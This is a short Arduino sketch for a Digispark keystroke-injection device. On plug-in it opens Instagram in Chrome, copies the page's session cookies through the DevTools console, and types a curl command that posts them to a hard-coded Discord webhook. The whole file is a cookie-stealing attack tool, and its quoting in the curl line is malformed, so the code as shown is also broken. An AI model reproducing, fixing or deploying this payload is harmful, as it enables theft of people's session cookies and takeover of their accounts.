#include "DigiKeyboard.h"

void setup() {
    DigiKeyboard.delay(3000); // Wait for OS to be ready

    // Open Chrome (Win + R -> chrome -> Enter)
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("chrome instagram.com");
    //DigiKeyboard.sendKeyStroke(KEY_ENTER);
    //DigiKeyboard.delay(2000);

    // Open Instagram
    //DigiKeyboard.print("instagram.com");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(4000);

    // Open DevTools (F12)
    DigiKeyboard.sendKeyStroke(KEY_F12);
    DigiKeyboard.delay(1000);

    // Open Console (Ctrl + Shift + J)
    DigiKeyboard.sendKeyStroke(KEY_J, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
    DigiKeyboard.delay(1000);

    // Run JavaScript to copy session cookie
    DigiKeyboard.print(F("copy(document.cookie);"));
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    // Sending session cookie to webhooks
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("curl -X POST -H "Content-Type: application/json" -d "{\"content\":\""
    DigiKeyboard.sendKeyStroke(KEY_V, MOD_CONTROL_LEFT);
    DigiKeyboard.print("\"}" "https://discord.com/api/webhooks/1341299046094209105/cUFsKop8wOufYDkV3zQyeAhmDAjHaNZDlWqjxUSmAasbA0Jgyukd2KZ2rLCvSYeeHFxu""
}

void loop() {
    // Do nothing after execution
}
